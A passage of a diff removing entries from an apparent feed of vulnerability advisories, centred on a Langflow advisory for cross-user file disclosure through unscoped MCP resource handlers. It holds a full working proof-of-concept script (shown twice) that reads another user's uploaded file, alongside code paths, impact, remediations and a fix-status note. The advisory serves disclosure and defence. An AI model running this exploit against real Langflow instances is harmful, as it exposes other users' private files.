-    --data-urlencode "username=$ATTACKER_USER" \
-    --data-urlencode "password=$PASS" | jq -r '.access_token'
-)
-
-export VICTIM_PROJECT_ID=$(
-  curl -sS -X POST "$BASE/api/v1/projects/" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"victim-project"}' | jq -r '.id'
-)
-
-export ATTACKER_PROJECT_ID=$(
-  curl -sS -X POST "$BASE/api/v1/projects/" \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"attacker-project"}' | jq -r '.id'
-)
-
-export VICTIM_FLOW_ID=$(
-  curl -sS -X POST "$BASE/api/v1/flows/" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d "{\"name\":\"victim-flow\",\"data\":{\"nodes\":[],\"edges\":[]},\"folder_id\":\"$VICTIM_PROJECT_ID\"}" \
-    | jq -r '.id'
-)
-
-printf 'cross-project-read-proof\n' &gt; /tmp/secret.txt
-
-export UPLOAD_JSON=$(
-  curl -sS -X POST "$BASE/api/v1/files/upload/$VICTIM_FLOW_ID" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -F "file=@/tmp/secret.txt"
-)
-
-export VICTIM_FILE=$(
-  printf '%s' "$UPLOAD_JSON" | jq -r '.file_path | split("/") | last'
-)
-
-export VICTIM_URI="$BASE/api/v1/files/download/$VICTIM_FLOW_ID/$VICTIM_FILE"
-
-export ATTACKER_API_KEY=$(
-  curl -sS -X POST "$BASE/api/v1/api_key/" \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"attacker-mcp-key"}' | jq -r '.api_key'
-)
-
-export DIRECT_STATUS=$(
-  curl -sS -o /dev/null -w '%{http_code}' \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    "$VICTIM_URI"
-)
-
-export MCP_READ_OUTPUT=$(
-uv run python - &lt;&lt;'PY'
-import asyncio
-import base64
-import os
-
-import httpx
-from mcp import ClientSession
-from mcp.client.streamable_http import streamable_http_client
-
-base = os.environ["BASE"]
-project_id = os.environ["ATTACKER_PROJECT_ID"]
-api_key = os.environ["ATTACKER_API_KEY"]
-victim_uri = os.environ["VICTIM_URI"]
-url = f"{base}/api/v1/mcp/project/{project_id}/streamable"
-
-async def main():
-    async with httpx.AsyncClient(headers={"x-api-key": api_key}, timeout=30.0) as client:
-        async with streamable_http_client(url, http_client=client) as (read_stream, write_stream, _):
-            async with ClientSession(read_stream, write_stream) as session:
-                await session.initialize()
-                result = await session.read_resource(victim_uri)
-                blob = result.contents[0].blob
-                print(base64.b64decode(base64.b64decode(blob)).decode().strip())
-
-asyncio.run(main())
-PY
-)
-
-echo "Direct /files/download as attacker -&gt; $DIRECT_STATUS"
-echo "Project-scoped MCP resources/read -&gt; $MCP_READ_OUTPUT"
-```
-
-Expected output:
-
-```text
-Direct /files/download as attacker -&gt; 404
-Project-scoped MCP resources/read -&gt; cross-project-read-proof
-```
-
-Observed server logs during verification:
-
-```text
-GET /api/v1/files/download/... 404 Not Found
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 200 OK
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 202 Accepted
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 200 OK
-```
-
-### Impact
-This is an authenticated IDOR / arbitrary file read issue in the MCP layer.
-
-Any authenticated Langflow user who can access at least one project-scoped MCP endpoint can read files belonging to other users by supplying a victim file URI to `resources/read`.
-
-Practical impact includes:
-
-- Cross-user disclosure of uploaded documents, CSV files, JSON files, prompts, and other flow-backed artifacts
-- Unauthorized access to sensitive business data stored in flow namespaces
-- Easier exploitation when global MCP helpers reveal other users' flow IDs and file names
-
-### Suggested Remediations
-1. Authorize `resources/read` against the authenticated context before calling storage.
-   Resolve `flow_id` to a database object and require both:
-   `flow.user_id == current_user.id`
-   and, for project-scoped transports, `flow.folder_id == current_project_id`.
-
-2. Stop trusting arbitrary file-download URIs as resource identifiers.
-   Instead, return opaque server-generated resource IDs from `resources/list` and resolve them server-side to an already authorized object.
-
-3. Scope global MCP enumeration helpers to the authenticated user.
-   `handle_list_resources()` and `handle_list_tools()` should not query all flows when `project_id=None`; they should return only flows owned by the current user, or require elevated privileges for broader discovery.
-
-
-
-### Fix Status (Maintainer Triage Update — 2026-09-22)
-
-This report is accurate. The vulnerable code path described above (missing
-ownership check in `handle_read_resource()`) has since been fixed.
-
-**Corrected affected version range:** `&gt;= 1.6.8, &lt;= 1.9.0` (not `&lt;= 1.8.3` —
-confirmed still vulnerable through `v1.9.0`; the fix landed with the `v1.9.1`
-release, not later).
-
-**Fixed in:** `v1.9.1` (GitHub Release published 2026-04-24), via PR
-[#12818 — "fix(mcp): close path traversal + cross-user disclosure (PVR0754098)"](https://github.com/langflow-ai/langflow/pull/12818).
-- Backport commit on `release-1.9.1`: `f0fd436fe9829192ee550e6cb46961a01dd37032`
-- Corresponding commit on `main`: `b8fe970493fd5fb2e1fc71dfccc79f90b76058fa`
-
-The fix:
-- `handle_read_resource()` now requires an authenticated user context and
-  resolves the namespace segment of the URI to a `Flow` row scoped to
-  `Flow.user_id == current_user.id`, additionally filtering on
-  `Flow.folder_id == project_id` for project-scoped MCP servers
-  (`src/backend/base/langflow/api/v1/mcp_utils.py`).
-- Rejects filenames containing `..`, `/`, or `\` as defense-in-depth against
-  path traversal, and applies the same containment check to the storage
-  layer's `get_file`/`get_file_stream`/`delete_file`/`get_file_size`
-  (`local.py`/`s3.py`, both in `langflow` and `lfx`).
-- `handle_list_resources()` / `handle_list_tools()` are now scoped to
-  `current_user.id` on the global (non-project) MCP server, closing the
-  cross-user enumeration this report also flagged.
-
-Verified independently against `langflow-ai/langflow` @ `89444c3bb5`
-(release-1.11.0 branch, current as of 2026-09-22): the fix is present, and
-the regression suite (`src/backend/tests/unit/api/v1/test_mcp_utils.py`,
-21/21 passing) includes `test_handle_read_resource_denies_other_users_flow`,
-which reproduces this report's exact cross-user scenario and asserts it now
-raises `ValueError("... access denied")`.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-4hmc-cfm3-w43c"&gt;https://github.com/advisories/GHSA-4hmc-cfm3-w43c&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/commit/b8fe970493fd5fb2e1fc71dfccc79f90b76058fa"&gt;https://github.com/langflow-ai/langflow/commit/b8fe970493fd5fb2e1fc71dfccc79f90b76058fa&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/commit/f0fd436fe9829192ee550e6cb46961a01dd37032"&gt;https://github.com/langflow-ai/langflow/commit/f0fd436fe9829192ee550e6cb46961a01dd37032&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/pull/12818"&gt;https://github.com/langflow-ai/langflow/pull/12818&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:GHSA-4hmc-cfm3-w43c</id>
-    <title>[UNKNOWN] GHSA-4hmc-cfm3-w43c: Langflow has Authenticated Cross-Project File Disclosure via Unscoped MCP Resource Handlers</title>
-    <link rel="alternate" href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-4hmc-cfm3-w43c" />
-    <updated>2026-10-07T20:35:13Z</updated>
-    <published>2026-10-07T20:35:12Z</published>
-    <summary>Langflow has Authenticated Cross-Project File Disclosure via Unscoped MCP Resource Handlers</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; GHSA-4hmc-cfm3-w43c&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; UNKNOWN&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; langflow&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;### Summary
-Langflow's project-scoped MCP transport authenticates the caller for the `project_id` in the connection URL, but the subsequent `resources/read` operation does not authorize the resource URI being requested. An authenticated user can connect to their own project-scoped MCP endpoint and supply a crafted file-download URI that points to another user's flow-backed file. The server then reads and returns the victim file without verifying ownership or project membership.
-
-This is a cross-user authorization bypass (`userA -&gt; userB`) that allows arbitrary read access to files stored under other users' flow namespaces.
-
-### Details
-Verified against local checkout:
-
-- Repository: `langflow-ai/langflow`
-- Verified on release tag: `v1.8.3`
-- Commit: `08bf98404cfd7737fde57a2588785766cdf1b42e`
-- Earliest stable release known to contain the vulnerable code path: `v1.6.8`
-
-Relevant code path:
-
-1. `src/backend/base/langflow/api/v1/mcp_projects.py:147-193`
-   `verify_project_auth_conditional()` authenticates the caller and checks access only to the `project_id` in the MCP transport URL.
-
-2. `src/backend/base/langflow/api/v1/mcp_projects.py:1238-1241`
-   The project-scoped MCP server registers `read_resource()` and forwards the attacker-controlled URI directly to `handle_read_resource(uri=uri)`.
-
-3. `src/backend/base/langflow/api/v1/mcp_utils.py:163-182`
-   `handle_read_resource()` parses the last two URI path segments as `flow_id` and `filename`, then directly calls:
-
-   ```python
-   storage_service.get_file(flow_id=flow_id, file_name=filename)
-   ```
-
-   No check ties the supplied `flow_id` back to the authenticated user or the current project.
-
-4. `src/backend/base/langflow/services/storage/local.py:141-149`
-   `src/backend/base/langflow/services/storage/s3.py:200-217`
-   The storage layer performs a raw namespace read and is not authorization-aware.
-
-The result is that authorization is enforced at MCP connection time, but not at resource-read time. Once an attacker has access to any project-scoped MCP endpoint they own, they can read another user's flow-backed file by passing a victim-controlled URI.
-
-This issue is also easier to exploit because the global MCP helpers expose cross-user discovery data:
-
-- `src/backend/base/langflow/api/v1/mcp_utils.py:102-121`
-  `handle_list_resources(project_id=None)` lists files for all flows.
-- `src/backend/base/langflow/api/v1/mcp_utils.py:333-380`
-  `handle_list_tools(project_id=None)` queries all flows and includes flow IDs in tool metadata.
-
-That global enumeration is not required for exploitation, but it makes obtaining victim identifiers much easier.
-
-### PoC
-Preconditions:
-
-- Langflow is running locally with authentication enabled.
-- Two separate users exist on the same instance.
-- The victim has a flow with an uploaded file.
-- The attacker has access to any project they own.
-
-Verify the issue locally by starting Langflow with:
-
-```bash
-cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'
-
-set -a
-source .env.verify
-set +a
-
-export LANGFLOW_CONFIG_DIR="$PWD/.langflow-verify"
-
-uv run python - &lt;&lt;'PY'
-from langflow.main import setup_app
-import uvicorn
-
-app = setup_app(backend_only=True)
-uvicorn.run(app, host="127.0.0.1", port=7860, log_level="debug")
-PY
-```
-
-Then, in a second terminal, the following script creates a victim user, an attacker user, a victim flow-backed file, and demonstrates that:
-
-- the normal file download route is blocked for the attacker (`404`)
-- the same file is readable through the attacker's own project-scoped MCP connection
-
-```bash
-cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'
-set -euo pipefail
-
-export BASE='http://127.0.0.1:7860'
-export PASS='Passw0rd!Passw0rd!'
-export VICTIM_USER="victim.$RANDOM@example.com"
-export ATTACKER_USER="attacker.$RANDOM@example.com"
-
-curl -sS -X POST "$BASE/api/v1/users/" \
-  -H 'Content-Type: application/json' \
-  -d "{\"username\":\"$VICTIM_USER\",\"password\":\"$PASS\"}" &gt;/dev/null
-
-curl -sS -X POST "$BASE/api/v1/users/" \
-  -H 'Content-Type: application/json' \
-  -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$PASS\"}" &gt;/dev/null
-
-export VICTIM_TOKEN=$(
-  curl -sS -X POST "$BASE/api/v1/login" \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
-    --data-urlencode "username=$VICTIM_USER" \
-    --data-urlencode "password=$PASS" | jq -r '.access_token'
-)
-
-export ATTACKER_TOKEN=$(
-  curl -sS -X POST "$BASE/api/v1/login" \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
-    --data-urlencode "username=$ATTACKER_USER" \
-    --data-urlencode "password=$PASS" | jq -r '.access_token'
-)
-
-export VICTIM_PROJECT_ID=$(
-  curl -sS -X POST "$BASE/api/v1/projects/" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"victim-project"}' | jq -r '.id'
-)
-
-export ATTACKER_PROJECT_ID=$(
-  curl -sS -X POST "$BASE/api/v1/projects/" \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"attacker-project"}' | jq -r '.id'
-)
-
-export VICTIM_FLOW_ID=$(
-  curl -sS -X POST "$BASE/api/v1/flows/" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d "{\"name\":\"victim-flow\",\"data\":{\"nodes\":[],\"edges\":[]},\"folder_id\":\"$VICTIM_PROJECT_ID\"}" \
-    | jq -r '.id'
-)
-
-printf 'cross-project-read-proof\n' &gt; /tmp/secret.txt
-
-export UPLOAD_JSON=$(
-  curl -sS -X POST "$BASE/api/v1/files/upload/$VICTIM_FLOW_ID" \
-    -H "Authorization: Bearer $VICTIM_TOKEN" \
-    -F "file=@/tmp/secret.txt"
-)
-
-export VICTIM_FILE=$(
-  printf '%s' "$UPLOAD_JSON" | jq -r '.file_path | split("/") | last'
-)
-
-export VICTIM_URI="$BASE/api/v1/files/download/$VICTIM_FLOW_ID/$VICTIM_FILE"
-
-export ATTACKER_API_KEY=$(
-  curl -sS -X POST "$BASE/api/v1/api_key/" \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    -H 'Content-Type: application/json' \
-    -d '{"name":"attacker-mcp-key"}' | jq -r '.api_key'
-)
-
-export DIRECT_STATUS=$(
-  curl -sS -o /dev/null -w '%{http_code}' \
-    -H "Authorization: Bearer $ATTACKER_TOKEN" \
-    "$VICTIM_URI"
-)
-
-export MCP_READ_OUTPUT=$(
-uv run python - &lt;&lt;'PY'
-import asyncio
-import base64
-import os
-
-import httpx
-from mcp import ClientSession
-from mcp.client.streamable_http import streamable_http_client
-
-base = os.environ["BASE"]
-project_id = os.environ["ATTACKER_PROJECT_ID"]
-api_key = os.environ["ATTACKER_API_KEY"]
-victim_uri = os.environ["VICTIM_URI"]
-url = f"{base}/api/v1/mcp/project/{project_id}/streamable"
-
-async def main():
-    async with httpx.AsyncClient(headers={"x-api-key": api_key}, timeout=30.0) as client:
-        async with streamable_http_client(url, http_client=client) as (read_stream, write_stream, _):
-            async with ClientSession(read_stream, write_stream) as session:
-                await session.initialize()
-                result = await session.read_resource(victim_uri)
-                blob = result.contents[0].blob
-                print(base64.b64decode(base64.b64decode(blob)).decode().strip())
-
-asyncio.run(main())
-PY
-)
-
-echo "Direct /files/download as attacker -&gt; $DIRECT_STATUS"
-echo "Project-scoped MCP resources/read -&gt; $MCP_READ_OUTPUT"
-```
-
-Expected output:
-
-```text
-Direct /files/download as attacker -&gt; 404
-Project-scoped MCP resources/read -&gt; cross-project-read-proof
-```
-
-Observed server logs during verification:
-
-```text
-GET /api/v1/files/download/... 404 Not Found
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 200 OK
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 202 Accepted
-POST /api/v1/mcp/project/&lt;attacker-project-id&gt;/streamable 200 OK
-```
-
-### Impact
-This is an authenticated IDOR / arbitrary file read issue in the MCP layer.
-
-Any authenticated Langflow user who can access at least one project-scoped MCP endpoint can read files belonging to other users by supplying a victim file URI to `resources/read`.
-
-Practical impact includes:
-
-- Cross-user disclosure of uploaded documents, CSV files, JSON files, prompts, and other flow-backed artifacts
-- Unauthorized access to sensitive business data stored in flow namespaces
-- Easier exploitation when global MCP helpers reveal other users' flow IDs and file names
-
-### Suggested Remediations
-1. Authorize `resources/read` against the authenticated context before calling storage.
-   Resolve `flow_id` to a database object and require both:
-   `flow.user_id == current_user.id`
-   and, for project-scoped transports, `flow.folder_id == current_project_id`.
-
-2. Stop trusting arbitrary file-download URIs as resource identifiers.
-   Instead, return opaque server-generated resource IDs from `resources/list` and resolve them server-side to an already authorized object.
-
-3. Scope global MCP enumeration helpers to the authenticated user.
-   `handle_list_resources()` and `handle_list_tools()` should not query all flows when `project_id=None`; they should return only flows owned by the current user, or require elevated privileges for broader discovery.
-
-
-
-### Fix Status (Maintainer Triage Update — 2026-09-22)
-
-This report is accurate. The vulnerable code path described above (missing
-ownership check in `handle_read_resource()`) has since been fixed.
-
-**Corrected affected version range:** `&gt;= 1.6.8, &lt;= 1.9.0` (not `&lt;= 1.8.3` —
-confirmed still vulnerable through `v1.9.0`; the fix landed with the `v1.9.1`
-release, not later).
-
-**Fixed in:** `v1.9.1` (GitHub Release published 2026-04-24), via PR
-[#12818 — "fix(mcp): close path traversal + cross-user disclosure (PVR0754098)"](https://github.com/langflow-ai/langflow/pull/12818).
-- Backport commit on `release-1.9.1`: `f0fd436fe9829192ee550e6cb46961a01dd37032`
-- Corresponding commit on `main`: `b8fe970493fd5fb2e1fc71dfccc79f90b76058fa`
-
-The fix:
-- `handle_read_resource()` now requires an authenticated user context and
-  resolves the namespace segment of the URI to a `Flow` row scoped to
-  `Flow.user_id == current_user.id`, additionally filtering on
-  `Flow.folder_id == project_id` for project-scoped MCP servers
-  (`src/backend/base/langflow/api/v1/mcp_utils.py`).
-- Rejects filenames containing `..`, `/`, or `\` as defense-in-depth against
-  path traversal, and applies the same containment check to the storage
-  layer's `get_file`/`get_file_stream`/`delete_file`/`get_file_size`
-  (`local.py`/`s3.py`, both in `langflow` and `lfx`).
-- `handle_list_resources()` / `handle_list_tools()` are now scoped to
-  `current_user.id` on the global (non-project) MCP server, closing the
-  cross-user enumeration this report also flagged.
-
-Verified independently against `langflow-ai/langflow` @ `89444c3bb5`
-(release-1.11.0 branch, current as of 2026-09-22): the fix is present, and
-the regression suite (`src/backend/tests/unit/api/v1/test_mcp_utils.py`,
-21/21 passing) includes `test_handle_read_resource_denies_other_users_flow`,
-which reproduces this report's exact cross-user scenario and asserts it now
-raises `ValueError("... access denied")`.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-4hmc-cfm3-w43c"&gt;https://github.com/langflow-ai/langflow/security/advisories/GHSA-4hmc-cfm3-w43c&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-105699"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-105699&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/pull/12818"&gt;https://github.com/langflow-ai/langflow/pull/12818&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/commit/b8fe970493fd5fb2e1fc71dfccc79f90b76058fa"&gt;https://github.com/langflow-ai/langflow/commit/b8fe970493fd5fb2e1fc71dfccc79f90b76058fa&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
